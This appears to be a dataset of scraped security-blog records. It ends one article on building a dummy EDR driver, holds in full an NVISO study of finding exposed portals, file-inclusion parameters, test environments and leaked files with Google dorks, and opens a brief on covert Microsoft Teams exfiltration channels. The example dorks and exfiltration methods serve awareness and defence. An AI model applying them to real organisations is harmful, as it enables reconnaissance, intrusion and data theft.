printf(\"\\tLaunched remote thread\\n\");\n\n            // Freeing allocated memory as well as handles\n            VirtualFreeEx(hProcess, vae_buffer, MESSAGE_SIZE, MEM_RELEASE);\n            CloseHandle(hThread);\n            CloseHandle(hProcess);\n            printf(\"\\tClosed handle\\n\");\n\n            wchar_t response[MESSAGE_SIZE] = { 0 };\n            swprintf_s(response, MESSAGE_SIZE, L\"OK\\0\");\n            DWORD pipeBytesWritten = 0;\n            \n            // Inform the driver that the injection was successful\n            WriteFile(\n                hServerPipe,       // Handle to the named pipe\n                response,          // Buffer to write from\n                MESSAGE_SIZE,      // Size of the buffer \n                &pipeBytesWritten, // Numbers of bytes written\n                NULL               // Whether or not the pipe supports overlapped operations\n            );\n\n            // Disconnect\n            DisconnectNamedPipe(\n                hServerPipe // Handle to the named pipe\n            );\n\n            printf(\"\\n\\n\");        \n        }\n    }\n}\n\nRunning all of that, we can see that the assembly code of the NtAllocateVirtualMemory function of the NTDLL.dll of a process that was injected is the following:\n\nWhile a more legitimate disassembled code should look like this:\n\nAs you can see the first assembly instruction of the hooked NtAllocateVirtualMemory function is a jmp which will redirect the code flow from the NTDLL.dll to the address “00007FFAA06A0FD6” which is… Our injected EDR’s DLL:\n\nAt this point our EDR is fully functional! Let’s test it!\n\nVIII/ MyDumbEDR demo\n\nNow that we have our two agents as well as the driver, we can compile them and launch the entire project to see it in action!\n\nTo simplify the launching of the entire EDR solution, I created a small batch script whose contents are the following:\n\n// Launches the kernel driver\nsc create mydumbedr type=kernel binpath=Z:\\windev\\MyDumbEDR\\x64\\Debug\\MyDumbEDRDriver.sys\nsc start mydumbedr\n// Starts the StaticAnalyzer agent\nstart cmd.exe /c Z:\\windev\\MyDumbEDR\\x64\\Debug\\MyDumbEDRStaticAnalyzer.exe\n// Starts the RemoteInjector agent \nstart cmd.exe /c Z:\\windev\\MyDumbEDR\\x64\\Debug\\MyDumbEDRRemoteInjector.exe \n// Starts dbgview.exe\nstart dbgview.exe\n\necho EDR's running, press any key to stop it\npause\n\n// Kills both agents and unloads the kernel driver\ntaskkill /F /IM MyDumbEDRStaticAnalyzer.exe \ntaskkill /F /IM MyDumbEDRRemoteInjector.exe\nsc stop mydumbedr\nsc delete mydumbedr\n\nLet’s run the EDR, open a notepad process that will be the target of the shellcode injection and run the ShellcodeInjector binary to see how the EDR works in live action:\n\nAs you can see, the StaticAnalyzer agent detected that the binary was malicious. The RemoteInjector injected the MyDumbEDRDLL into the malicious process and when it tried to allocate a memory page with RWX to write and execute the shellcode, the EDR detected it and terminated the process thus protecting the notepad.exe process.\n\nAs such, we can say that our EDR is strong enough to detect both statically and dynamically malicious binaries trying to remotely inject shellcode!\n\nIX/ Conclusion\n\nThroughout this article we have seen how to develop a Windows driver, how to turn it into a EDR’s kernel driver and how to build a dummy EDR.\n\nThere are 3 reasons why I wanted to create such a thing. First I wanted to better understand how EDR’s are architected so that I can learn how to analyse the ones I’m fighting against during assessments.\n\nSecond, I wanted to do this research to provide an article that can be used by anyone that like me, wants to understand how EDR’s work and give them a few ideas about how you can bypass one. For that reason, I’m leaving you with a challenge: bypass MyDumbEDR. In the following repo you will find the source code of the EDR created in this blogpost as well as instructions to “capture the flag”. There are multiple ways you can bypass it, so I encourage you to read the code closely. I implemented some stupid logic that IS actually used by some EDR’s.\n\nThe last reason I wanted to work on building my EDR was to see how complicated it is to create a functional one. As pentesters, and red teamers, we are used to saying things like “Haha this EDR is terrible, I bypassed it easily”. Yeah you did, congrats. But remember that building a security product that is able to both detect malicious behaviours and not create too much false positives is a pain. As such, I’d like to finish this article by giving a huge thumbs up to both security product developers as well as blue teamers that are messing with the red’s during our assessments!\n\nHappy hacking folks!\n\nThis is a cross-post from: https://blog.whiteflag.io/blog/from-windows-driver-to-a-almost-fully-working-edr/.",
    "title": "Sensecon 23: from Windows drivers to an almost fully working EDR"
}
{
    "brief": "Below is a short list of vulnerabilities identified during the security research, using only the Google search bar on the web applications of Belgian corporations:       ...        The technique Google Dorking is also referred to as Google hacking, which is a method used by security researchers and cybercriminals to exploit the power of the Google search engine to unearth vulnerabilities on the Internet.       ...        However, we will not share any of the actual Google dork queries or the methodology behind them that were used to identify vulnerabilities.       ...        Therefore, an attacker can easily guess those credentials if not changed and gain access to the management portal.       ...        Upon identifying the target software, the attacker can use a combination of Google search operators to refine the search results to only display web applications hosting that specific management portal.       ...        A lot of management portal software names are written in the title of the web application which is not a security issue at all.       ...        The usage of a single Google dork will, of course, not provide the most refined results to target a specific management portal application.       ...        However, the approach is the same; more advanced operators in combination have to be used in order to target very specific management portals.       ...        To limit the access of robots and web crawlers to your site, you can add the following robots.txt file to the root directory of the web server hosting the management portal application:       ...        The compromise of a web server will not be due to web crawlers indexing the endpoint of a management portal or the presence of a software name within the title tag.       ...        The methodology for identifying LFI vulnerabilities using Google dork may not be as straightforward as identifying management portals.       ...        It is possible to search specifically for these common parameters, which are used for such purposes.       ...        There are several Google search queries that can be used to search for the presence of these parameters in web applications.       ...        The following is an example of a Google dork:       ...        The above shown Google dork query searches web applications with “file” in their URL.       ...        However, as you will notice, these search results will not refine to web applications containing parameters named “file” but will also include directories with the string “file.” During my research, I was able to use a combination of several Google search queries with specific key characters and special characters to refine the search results to web applications only with a “file” parameter in their URL.       ...        As explained above, I developed a methodology that refines Google search results to identify web applications hosted in Belgium, which contain the specific parameters I was targeting.       ...        Do note that depending on the structure of the web application, it might not be possible to create such Disallow entries, since those parameters are used in functionality that is by design intended to be public and should be included in search results.       ...        Test environments are often hosted under a subdomain of the production web applications.       ...        With the information obtained above a Google Dork can be defined to search specifically for web servers containing those subdomains within the URL.       ...        The remediation steps for test environments are quite straightforward.       ...        Sensitive Information Disclosure Description       ...        The Google dork can also be utilized to search for specific strings.       ...        This functionality can be leveraged to search for sensitive strings or directories to discover potentially sensitive information on web servers.       ...        The above search query is used to identify openly accessible directories that include the word ‘app.’ While a directory listing on a web server already presents a security issue, it does not necessarily mean that an attacker will immediately find sensitive information due to this issue.       ...        Finally, during the research I found a lot of web servers exposing sensitive information such as, plain-text database credentials, plain-text credentials of login portals, web server configurations and even such issues which cannot be mentioned.       ...        The methodology in order to identify XSS vulnerabilities is akin to that used for identifying LFI vulnerabilities though the use of Google dork.       ...        Next, refining Google dork queries to target these specific parameters and uncover the web applications for vulnerabilities.       ...        Figure 9 – Asking ChatGPT for a Google Dork       ...        As previously demonstrated, we obtained a Google search query to search for web servers that meet our specific criteria.       ...        For the purposes of the security research, I employed a commonly used XSS payload to demonstrate to the relevant company or organization the presence of such a vulnerability.       ...        Last but not least, how much the above scenario is applicable for the organization in question is for me to know and for the audience to find out.       ...        In order to prevent cybercriminals to uncover sensitive information or vulnerabilities on your web applications using Google dork, a proactive approach is required to manage your online resources.       ...        However, in the case that a developer solely relied on the robots.txt file to hide the sensitive parts of their web application and included those directories and files, this information can act as a roadmap to your sensitive information on your website for attackers.       ...        Below is a real-world example of a robots.txt file used by a web server not allowing to index the top-secret directory.       ...        However, an attacker can gain valuable information by a publicly available file on the web server.       ...        Then, if an attacker can identify a vulnerability such as a LFI I found earlier during this research, without any doubt, it will be the first place to exfiltrate data as a directory called top-secret will most likely contain sensitive information.       ...        However, it can serve as a defense-in-depth approach to take a countermeasure for exposing sensitive information on your web server.       ...        Nevertheless, it has an impact on the likelihood of the vulnerability.       ...        The first factor is what kind of an impact the vulnerability has on the web application in question.       ...        From my research, I concluded that there is not a solid one way solution to prevent attackers easily identifying vulnerabilities and exposed sensitive information on your web servers.       ...        Secure storage of sensitive data: The web server’s file directory should not store sensitive data such as personal information at all.       ...       ",
    "html_url": "https://blog.nviso.eu/2024/01/22/is-the-google-search-bar-enough-to-hack-belgium-companies/",
    "text": "In this blog post, we will go over a technique called Google Dorking and demonstrate how it can be utilized to uncover severe security vulnerabilities in web applications hosted right here in Belgium, where NVISO was founded. The inspiration for this security research arose from the observation that many large organizations have fallen victim to severe security breaches, with the perpetrators often being individuals under the age of 18. A recent incident involved an 18-year-old hacker who managed to infiltrate Rockstar Games using just a hotel TV, a cellphone, and an Amazon Fire Stick while under police protection. This can be caused by two possibilities: either these young cybercriminals possess exceptional talent and skills, which we are certain of, and/or the importance of cybersecurity is not being sufficiently prioritized yet by many organizations.\n\nIn 2020, Belgium was ranked first on the National Cyber Security Index (NCSI), which measures the preparedness of countries to prevent cyber threats and manage cyber incidents. As Belgium was leading this ranking, my curiosity was triggered regarding the security of Belgium’s digital landscape.\n\nFor the purpose of the security research, I will adopt the role of a ‘script kiddie’ – individuals using existing scripts or programs to exploit computer systems, often without a deep understanding of the underlying technology. Furthermore, I will restrict myself to solely using the Google search bar to identify the vulnerabilities without utilizing any tool that could potentially automate certain tasks.\n\nHacking the digital infrastructure of companies prior their consent is illegal. However, Belgium has published a new Coordinated Vulnerability Disclosure Policy, which allows citizens with good intentions to identify possible vulnerabilities and report to the affected company within a 72-hour window. This is not the sole prerequisite to identify vulnerabilities within Belgium companies. Additional details about the policy can be found on the website of the Centre for Cybersecurity Belgium (CCB) .\n\nAll the vulnerabilities identified during the security research have been appropriately reported to the affected companies and Belgium’s national CSIRT team.\n\nIntroduction\n\nThe vulnerabilities identified during the security research were not being exploited, as it is still prohibited by the newly published framework to perform such actions. The objective was to verify the existence of a vulnerability, not to examine the extent to which one can penetrate a system, process, or control. Therefore, the identification of vulnerabilities was based on proof-of-concepts or explanations to the organizations about the potential implications of the vulnerabilities. Below is a short list of vulnerabilities identified during the security research, using only the Google search bar on the web applications of Belgian corporations:\n\nRemote code execution (RCE)\nLocal file inclusion (LFI)\nReflected cross-site scripting (XSS)\nSQL injection\nBroken Access Control\nSensitive information disclosure\nWhat is Google Dorking?\n\nThe technique Google Dorking is also referred to as Google hacking, which is a method used by security researchers and cybercriminals to exploit the power of the Google search engine to unearth vulnerabilities on the Internet.\n\nIn essence, the Google search engine functions like a translator, deciphering search strings and operators to deliver the most relevant results to the end user. A couple of examples of Google operators are as follow:\n\nsite: This operator restricts the search results to a specific website or domain. For example, “site:nviso.eu” would return results only from the NVISO website.\nFigure 1 – Site Operator\ninurl: This operator searches for a specific text within the URL of a website. For example, “inurl:login” would return results for web pages that have “login” in their URL.\nFigure 2 – Operator combinations\nGoogle search bar in action\n\nDuring the research, I developed a methodology and used my creativity to identify numerous high to critical security issues, none of which relied on online resources, such as the Google Hacking Database. However, we will not share any of the actual Google dork queries or the methodology behind them that were used to identify vulnerabilities. Doing so would pose a significant security risk to many Belgian corporations. Moreover, we are committed to making our digital landscape safer, not to teaching someone with bad intentions how to learn and infiltrate these corporations. Therefore, we will discuss each identified specific vulnerability in more depth, the approaches of cybercriminals, and, most importantly, how to fix or remediate such issues.\n\nDefault credentials\nDescription\n\nDefault credentials are pre-configured credentials provided by many manufacturers for initial access to software applications. The objective is to simplify the setup process for users who are configuring the application for the first time. However, since these credentials are often common knowledge, they are publicly available and easily found in user manuals or online documentation. As a result, the usage of default credentials can still lead to severe security incidents as they grant highly privileged access to management interfaces. Further, this issue can arise in occasions where a system administrator or developer does not change the default credentials which are provided during the initial setup of the management interface. Therefore, an attacker can easily guess those credentials if not changed and gain access to the management portal.\n\nApproach\n\nThe first step for an attacker is to target a specific CRM, CMS, or any other widely-used management portal. This information can be easily obtained with a basic Google search. Upon identifying the target software, the attacker can use a combination of Google search operators to refine the search results to only display web applications hosting that specific management portal.\n\nA lot of management portal software names are written in the title of the web application which is not a security issue at all. However, if an attacker identifies the software version in use on the web application, they can conduct more targeted reconnaissance activities against the web application. An example Google dork which can be found on the Google Hacking Database is as follow:\n\nintitle: \"Login - Jorani\"\n\nThe results of the Google search lists the web applications which have “Login – Jorani” within the title tag. This can also be verified by navigating to one of the web applications listed in the Google search results. As demonstrated below, the title of the web application contains the string used with the intitle operator:\n\nFigure 3 – HTML title tag\n\nAdditionally, to reinforce the earlier statement about the publicly available information of default credentials, a simple Google search discloses the default credentials for the Jorani management software without even navigating to the documentation:\n\nFigure 4 – Jorani default credentials\n\nIt can be noticed that by simply searching publicly available resources, an attacker can identify and perform targeted reconnaissance on web applications without performing any illegal or harmful actions. The steps taken so far are considered passive and non-malicious, which makes this approach even more interesting.\n\nReal-world scenario\n\nThe usage of a single Google dork will, of course, not provide the most refined results to target a specific management portal application. However, the approach is the same; more advanced operators in combination have to be used in order to target very specific management portals. During my research, advanced operators were utilized to search for a popular management portal that also includes default credentials during its initial setup. This was, of course, based on my experience in the penetration testing field and creativity. Upon analyzing the Google search results, one company was identified as using default credentials for their management portal. Further, upon gaining access to the management portal, it can lead to the full compromise of the server hosting the web application.\n\nAs penetration testers conducting daily assessments of web applications, we can attest to the severity of the security issue and its potential consequences. Furthermore, adherence to a responsible disclosure policy entails demonstrating the vulnerability without expanding the scope of the research. The first identified vulnerability has raised significant concerns, particularly as the organization in question is a large Belgian company. In short, this vulnerability can allow an attacker to easily establish an initial foothold within the network of the affected organization.\n\nRemediation\n\nManagement portals are not intended for daily users or even employees tasked with specific duties. Instead, they are most often accessed by users with administrative rights who manage certain aspects of the software. Therefore, it is not important for a management portal to rank highly in Google search results or for SEO optimization purposes.\n\nTo limit the access of robots and web crawlers to your site, you can add the following robots.txt file to the root directory of the web server hosting the management portal application:\n\nUser-agent: *\nDisallow: /\n\nThe robots.txt file is not a security threat in itself, nor is it a foolproof method to block robots and web crawlers from accessing your site. Many robots or web crawlers may not heed the file and simply bypass it. However, following this best practice can serve as part of a defense-in-depth strategy, helping to mitigate potential issues.\n\nNext, as previously mentioned, many management portal applications include the software name and sometimes even the software version within the title tag or generator tag in the source code. While the presence of this information is not a security issue at all, it can make it more easier for attackers to identify the underlying software version and perform targeted reconnaissance.\n\nLast but not least, the use of default credentials remains a common issue in many applications. The compromise of a web server will not be due to web crawlers indexing the endpoint of a management portal or the presence of a software name within the title tag. The root cause is the usage of default credentials on management portals. Since these portals also allow the performance of various tasks with high-level permissions, it is crucial to establish defined policies and conduct regular audits to prevent such simple yet critical misconfigurations.\n\nLocal File Inclusion (LFI)\nDescription\n\nLocal File Inclusion (LFI) is a type of vulnerability which allows attackers to include and potentially even execute local files on the server. An attacker exploiting an LFI can read sensitive files, such as configuration files, source code, or data files. However, the impact of this kind of a vulnerability is influenced by the permissions of the user account under which the web server is running. Moreover, a common misconfiguration arises when web servers are run with high-level privileges, such as root on Unix-based and SYSTEM on Windows-based systems. This could allow an attacker to access almost any file on the server and completely compromise the server.\n\nApproach\n\nThe methodology for identifying LFI vulnerabilities using Google dork may not be as straightforward as identifying management portals. However, web applications often use common parameters to retrieve the contents of a local file. It is possible to search specifically for these common parameters, which are used for such purposes. Some of these commonly known parameters include “file,” “page,” and others. There are several Google search queries that can be used to search for the presence of these parameters in web applications. The following is an example of a Google dork:\n\ninurl:file\n\nThe above shown Google dork query searches web applications with “file” in their URL. However, as you will notice, these search results will not refine to web applications containing parameters named “file” but will also include directories with the string “file.” During my research, I was able to use a combination of several Google search queries with specific key characters and special characters to refine the search results to web applications only with a “file” parameter in their URL.\n\nReal-world scenario\n\nAs explained above, I developed a methodology that refines Google search results to identify web applications hosted in Belgium, which contain the specific parameters I was targeting. Using this methodology, I quickly identified a web server hosted in Belgium and retrieved a common local file present on Unix-based systems.\n\nRemediation\n\nTo instruct web crawlers or robots not to index URLs with certain parameters, the “Disallow” directive can be used. A real-world example can be found below:\n\nFigure 5 – Disallow parameter entries\n\nThe “Disallow” directives in a robots.txt file instruct search engine crawlers not to index the specific paths provided. This helps to keep private or non-content pages out of search engine results and can also prevent the exposure of sensitive areas of the site to the public. Therefore, the steps to take include identifying those certain parameters within your web application and adding Disallow directives for those parameters in the robots.txt file.\n\nDo note that depending on the structure of the web application, it might not be possible to create such Disallow entries, since those parameters are used in functionality that is by design intended to be public and should be included in search results.\n\nHowever, once again, the root cause of the identified vulnerability, is not due the lack of a Disallow entry. Since, upon investigating the application, an attacker will be still be able to exploit the vulnerability. The only difference would be the ease of identifying the vulnerability just by a Google search.\n\nTest environment externally accessible\nDescription\n\nTest environments are a setup that closely mimics the production environment but is used exclusively for testing purposes. In the context of web development, test environments have different stages such as commonly called development, user acceptance testing (UAT), pre-production but at the end are not production environments and should be not publicly accessible. Since, test environments may not be secure as production environments with known vulnerabilities that have not been yet patched. Next, it might contain sensitive or real data for testing purposes. Those are just some examples of security issues that can arise when a test environment is publicly accessible.\n\nApproach\n\nTest environments are often hosted under a subdomain of the production web applications. However, the discovery of those subdomains can sometimes be time consuming and will require an attacker to brute-force the domain for the discovery. Besides I’m acting as a script kiddie and want to avoid the automation of certain tasks, the usage of artificial intelligence (AI) can even play a role. Below the question is shown to be asked to an AI Chatbot internally used by NVISO to fulfill my requirements for this task.\n\nFigure 6 – Subdomain discovery using AI\n\nThe AI Chatbot responded with several common subdomains which developers use to manage different environments for software development. With the information obtained above a Google Dork can be defined to search specifically for web servers containing those subdomains within the URL. An example Google dork can be found within the Google Hacking Database with the ID 5506:\n\nsite:dev.*.*/signin\n\nThe Google dork above is used to search for developers’ login pages across various locations. However, this operator may not be specific enough, potentially yielding results for web applications hosted worldwide. Additionally, my research into databases and other online resources did not reveal a straightforward Google dork for locating test environments of web applications. Consequently, it’s necessary to think outside the box and explore how to refine Google searches to specifically target test environments.\n\nReal-world scenario\n\nSuccessfully, my developed methodology, combined with the use of multiple advanced operators, enabled me to identify several vulnerabilities in the test environments of web applications hosted in Belgium.\n\nFollowing, during the research several WordPress installations were found within a development environment that were improperly configured. Those misconfigurations allow an attacker to complete the installation of a WordPress instance and achieve remote code execution by uploading a malicious PHP file which is also a publicly available resource.\n\nSecond, a different Google dork was used to identify also a common subdomain for development environments and the results were once again eye-opening. A web server exposing the username of the administrator user and the hash of the password within a file.\n\nRemediation\n\nThe remediation steps for test environments are quite straightforward. Only authorized users should have access, so a form of authentication should be configured, such as a VPN or a firewall. With this in place, the test environment will no longer be available to the Internet, and any potential attacks from outside the network will be eliminated with this approach.\n\nSensitive Information Disclosure\nDescription\n\nThe risk due to disclosure of unintended information in web applications can vary significantly based on the type of information disclosed to the public audience. These kinds of issues can occur unnoticed but can have a severe impact depending on the information disclosed. Some examples include plain-text credentials for login portals, databases, repositories, and much more.\n\nApproach\n\nThe Google dork can also be utilized to search for specific strings. This functionality can be leveraged to search for sensitive strings or directories to discover potentially sensitive information on web servers.\n\nBesides searching for sensitive strings or directories, directory listing on web servers can ease the reconnaissance phase for an attacker as it already shows all the available directories/files on the web server. For the sake of the research, searching for web servers with directory listing enabled in combination with key strings which can potentially indicate sensitive information can ease the discovery. An example Google dork can be found within the Google Hacking Database with the ID 8376:\n\nintext:\"index of\" app\n\nThe above search query is used to identify openly accessible directories that include the word ‘app.’ While a directory listing on a web server already presents a security issue, it does not necessarily mean that an attacker will immediately find sensitive information due to this issue.\n\nDuring my research, this part was the most enjoyable because you’re never sure what you’ll come across, and you need to be as creative as possible since sensitive information could be disclosed anywhere on web servers.\n\nSomething I discovered after completing my security research was the potential for automation in identifying sensitive information, as this process can be time-consuming. What if this approach could be automated using artificial intelligence? For example, scraping web servers from the search results and then submitting the output to OpenAI’s ChatGPT to determine if the content contains sensitive information.\n\nThis approach can significantly automate certain tasks and give us the ability to discover those security issues quicker. However, as I’m performing the security research as a script kiddie with limited programming language ability, this is a side note how things can easily get abused. Therefore, we’ll make a proof-of-concept and submit a config file into ChatGPT and ask ChatGPT like an average user if the submitted content contains sensitive information.\n\nI generated 100 paragraphs of lorem ipsum and inserted the following within one of the paragraphs: `dbpass=admin, dbpass=admin` and asked if the above content contains sensitive information. As expected, ChatGPT notified this and reported to us.\n\nFigure 7 – Check sensitive content using OpenAI\nReal-world scenario\n\nFinally, during the research I found a lot of web servers exposing sensitive information such as, plain-text database credentials, plain-text credentials of login portals, web server configurations and even such issues which cannot be mentioned. However, I noticed that the combination of multiple operators can significantly increase the ability to discover sensitive information on web servers. Let’s say that we’re interested in finding all PDF documents within web servers with a TLD .de. Further, it’s common that organizations tag internal documents with a specified classification such as “Classification: Internal use only” or related. Therefore, the presence of a string which can potentially indicate sensitivity within the document can also be used. To wrap up all the above mentioned operators, we’ll get something like below search query:\n\nsite:XX intext:XX AND intext:XX ext:XX\n\nThe above search query was invented while writing the blog post to avoid revealing the query I originally used to identify the vulnerability. Nevertheless, I still obtained a document that satisfied those results, which could lead to another potential security issue. Moreover, since Germany does not have such a CDVP (Common Vulnerability Disclosure Policy), I did not access the document or check its content. However, the Google search result already revealed enough information.\n\nRemediation\n\nOnce again, since sensitive information can be disclosed anywhere in an application and can vary significantly based on the type of information disclosed, there is unfortunately no straightforward way to address all these issues. Therefore, we should adopt a proactive approach and handle these issues with several actions, such as regular security audits or penetration tests. However, even with these assessments, it is possible that some issues may not be identified due to scope limitations. Consequently, a targeted online footprint analysis assessment can be conducted by your professionals if they possess the necessary skills, or hiring a third-party provider.\n\nReflected Cross-site Scripting\nDescription\n\nCross-Site Scripting is a type of vulnerability that allows attackers to inject malicious JavaScript code into web applications. This code is then executed in the user’s browser when the application reflects or stores the injected scripts. In the case of a reflected XSS, the attack is often delivered to the victim via a link from the trusted domain. Once the victim clicks on the link, the web application processes the request and includes the malicious script in the response executing it in the user’s browser. Moreover, the gravity of such an attack is increased if the compromised web application is hosted under a popular trusted domain which convince the users more likely to click on the malicious link.\n\nApproach\n\nThe methodology in order to identify XSS vulnerabilities is akin to that used for identifying LFI vulnerabilities though the use of Google dork. The approach involves searching for URL parameters that are commonly susceptible to XSS attacks. Next, refining Google dork queries to target these specific parameters and uncover the web applications for vulnerabilities.\n\nDuring the research, I have incorporated the use of an AI chatbot to generate a list of the most frequently used URL parameters susceptible for XSS attacks.\n\nFigure 8 – Searching common parameters using AI\n\nAs shown above, I received a list of parameters from the AI Chatbot that may be susceptible to XSS vulnerabilities. Further, I asked the Chatbot the appropriate Google search operator that would facilitate the identification of web servers incorporating any of these parameters in their URLs.\n\nFigure 9 – Asking ChatGPT for a Google Dork\n\nAs previously demonstrated, we obtained a Google search query to search for web servers that meet our specific criteria. However, the search query did not fully meet our objectives, prompting us to conduct further research and refine our search parameters. Once again, the refined and enhanced Google search query has been omitted for security risk reasons.\n\nReal-world scenario\n\nDuring my research, the “adjusted” aforementioned approach yielded XSS vulnerabilities on the web servers of Belgium companies. To verify the presence of an injection vulnerability on a web server, I began by attempting to inject HTML tags. Following a successful HTML injection, the next phase involved the insertion of a malicious JavaScript code. For the purposes of the security research, I employed a commonly used XSS payload to demonstrate to the relevant company or organization the presence of such a vulnerability. Regrettably, to protect the confidentiality and security of the involved entity, I am obliged to withhold detailed information regarding the initial discovery, providing only a limited disclosure as follows:\n\nFigure 10 – Exploiting reflected XSS vulnerability\n\nImagine a scenario where a well-known organization’s web server is discovered to have a vulnerability of the kind previously discussed. Further, obtaining the contact details for such an organization would be trivial task for even a novice hacker, given the wide availability of tools designed for this purpose. Following, armed with this information, the attacker can easily craft and dispatch phishing emails to the organization’s staff, falsely claiming that an urgent password reset is required due to a recent cyber-attack. Next, if an employee were to click on the provided link, they would encounter a compromised user interface on the web server, masquerading as a legitimate password recovery portal. In reality, this portal would be under the attacker’s control.\n\nAs shown, the scenarios are endless, and the cybercriminals are for sure aware of it when exploiting those kind of vulnerabilities. Last but not least, how much the above scenario is applicable for the organization in question is for me to know and for the audience to find out.\n\nRemediation\n\nIn order to remediate or prevent XSS attacks on web servers, a robust input validation and sanitization strategy has to be implemented. All user-supplied data should be treated as untrusted and validated against a strict set of rules to ensure it conforms to expected formats.\n\nHow to prevent Google Dorking\n\nIn order to prevent cybercriminals to uncover sensitive information or vulnerabilities on your web applications using Google dork, a proactive approach is required to manage your online resources. A common way used to handle this is the usage of the robots.txt file which will prevent search engine bots from indexing sensitive parts of your website. Further, the presence of a robots.txt file in itself does not pose a security risk at all and can even serve several non-security related purposes such as SEO optimization. However, in the case that a developer solely relied on the robots.txt file to hide the sensitive parts of their web application and included those directories and files, this information can act as a roadmap to your sensitive information on your website for attackers.\n\nIn order to align what I stated in the above paragraph, I used the following Google dork to find all robots.txt files in websites that contains a directory called top-secret:\n\ninurl:robots ext:txt \"top-secret\"\n\nBelow is a real-world example of a robots.txt file used by a web server not allowing to index the top-secret directory. At first sight, you might think that this information does not pose a direct security risk for the web application. However, an attacker can gain valuable information by a publicly available file on the web server. Then, if an attacker can identify a vulnerability such as a LFI I found earlier during this research, without any doubt, it will be the first place to exfiltrate data as a directory called top-secret will most likely contain sensitive information.\n\nFigure 11 – Top-secret entry within a robots.txt file\n\nTo conclude, the robots.txt file is not a security measure to completely rely on in order to prevent Google Dorking. However, it can serve as a defense-in-depth approach to take a countermeasure for exposing sensitive information on your web server.\n\nAn important side note I would like to tell you is that none of the uncovered vulnerabilities are related to Google’s search engine as it only serves a way to find the information requested from the Internet. Nevertheless, it has an impact on the likelihood of the vulnerability. At NVISO, we score the overall risk of a vulnerability during an assessment based on two key factors. The first factor is what kind of an impact the vulnerability has on the web application in question. Furthermore, the second factor is the likelihood. The likelihood is further divided in two sub-sections which are likelihood of discovery and likelihood of exploitation. A very important sub-section is the likelihood of discovery which basically lets us rate how easy it is for an attacker to discover the existing vulnerability. As I’m sure you’ll understand, I brought this to your attention as discovering vulnerabilities on web applications just using a Google search bar will score a high likelihood of discovery. Simply, it’s not only about the impact but also likelihood.\n\nFrom my research, I concluded that there is not a solid one way solution to prevent attackers easily identifying vulnerabilities and exposed sensitive information on your web servers. Since, if the vulnerability exists there is still a way to uncover it aggressively or passively. However, the following countermeasures in combination can act as a defense-in-depth approach:\n\nImplementation of strong access controls: First of all, it should be determined which users should have access to the which sensitive parts of the web application. Further, a clearly defined strong access control mechanism should be implemented.\nSecure storage of sensitive data: The web server’s file directory should not store sensitive data such as personal information at all. Sensitive information should be solely stored on a central storage location and retrieved by the web server if necessary.\nRegular penetration and vulnerability assessments: The Google Dorking method will have no sense if a web server is built securely. Meaning, that it’s not vulnerable to any type of vulnerabilities and/or does not expose any sensitive information. Hence, I was able to exploit the vulnerabilities or discover sensitive information due to the fact that the web servers were not built securely. Further, this is not a straight away solution and therefore regular penetration, and vulnerability assessments can discover these kind of issues and help the companies remediated them.\nConclusion\n\nThe security of Belgium’s digital environment cannot be determined by a single security research project alone. As a consultant working closely with numerous organizations, I am convinced that everyone in this sector is striving to enhance our digital safety. Even so, there is considerable scope for improvement. Because it is easier for cybercriminals to know a vulnerability and look which resource is vulnerable, rather than to target a known resource for potential vulnerabilities.\n\nHowever, based on my research, it appears that, while it’s possible for someone with minimal technical expertise to exploit vulnerabilities in certain companies, the statement that large Belgian corporates can be hacked solely using Google search queries would be a broad generalization. It’s important to clarify that these search queries can be helpful during the reconnaissance phase of an attack, which is just the initial step in a series of actions taken by potential adversaries. This preliminary phase presents an opportunity for companies to implement preventive and detective measures to mitigate and manage the impact.\n\nThe objective of the blogpost is to enhance the security awareness within our community by highlighting the potential risks associated with seemingly minor misconfigurations.\n\nFrom Belgium, we stand strong in our commitment to cybersecurity. Let’s keep working together to keep our online world safe. Stay alert, stay secure, and stay safe.\n\nReferences\nCCB – Vulnerability reporting to the CCB\nhttps://ccb.belgium.be/en/vulnerability-reporting-ccb\nCBC News – Teen who leaked GTA VI sentenced to indefinite stay in “secure hospital”\nhttps://www.cbsnews.com/news/grand-theft-auto-leak-teen-hacker-hospitalized/\nExploit-DB – Google Hacking Database\nhttps://www.exploit-db.com/google-hacking-database\nPortSwigger – Robots.txt file\nhttps://portswigger.net/kb/issues/00600600_robots-txt-file\nAlpgiray Saygin\n\nAlpgiray Saygin works as a cybersecurity consultant within the NVISO Software Security Assessment team. His expertise is primarily focused towards conducting a variety of assessments, including internal, external, web, wireless, and vulnerability assessments. An enthusiast for self-improvement, he enjoys the opportunity to challenge himself by pursuing certifications and engaging in security research during his free time.\n\nLinkedIn\nShare this:\nTwitterRedditWhatsAppEmail\nLike this:\nLoading...",
    "title": "Is the Google search bar enough to hack Belgian companies?"
}
{
    "brief": "In this article, four covert channels are discussed, with three dedicated to outgoing and the fourth to incoming traffic.       ...        The identified covert channels for outgoing traffic include a webhook, a Teams message, and a Teams call channel.       ...        However, for incoming traffic, the article outlines a message covert channel, which is different from any of the outgoing message channel.       ...        Outgoing Channel: Webhook       ...        In the Microsoft Teams settings, a webhook can be attached to a Teams channel, providing an outside world API to deposit messages in that channel.       ...        Figure 2: Incoming Webhook Covert Channel Flowchart       ...        On the victim side, a Teams card (JSON) is created including an image reference linking to the attacker’s server (AS), appending data to be exfiltrated (resultquery).       ...        The video (Figure 3: Webhook Data Exfiltration Demo) displays a proof-of-concept setup and procedure for how data can be exfiltrated using webhooks.       ...        Afterwards, the victim will launch a script that sends Teams cards to the webhook and appends each entry from a list of strings (data to exfiltrate) to an embedded image, which is then ultimately being requested from the attacker server.       ...        It might not be obvious at first glance but note that prohibiting webhook creation by Teams configuration will not necessarily stop an attacker from creating their own channel with a malicious webhook and using that one for an attack.       ...        However, this would need interception or proxyfication of Teams traffic which is not necessarily supported.       ...        The covert channel can be created by encapsulating the data into UDP packets and sending them over to the relay server.       ...        The incoming packets are not validated by the server and are thus forwarded to the other user on the call (the attacker).       ...        Once the client is successfully authenticated to the relay server, it should be able to send traffic to the server using e.g. UDP.       ...        However, to avoid any confusion, the PoC is designed to inject additional packets to an outgoing UDP call (Figure 4) connection which was previously negotiated using the ICE protocol and all traffic is relayed over an Internet server.       ...        Unfortunately, the call’s UDP packets and the data to exfiltrate, specifically when data is encrypted before exfiltration, have very similar entropy.       ...        This fourth and last covert channel allows for an incoming connection from the attacker to the victim.       ...        The channel exploits the message flow in a similar manner as the previous covert channel.       ...        To send a Microsoft Teams message through the API on https://amer.ng.msg.teams.microsoft.com, the following JSON structure is needed:       ...        It is possible to send HTML instead of text in the “content” field, defining key “messagetype” to “RichText/Html”.       ...        The discovery of covert channels within Microsoft Teams introduces 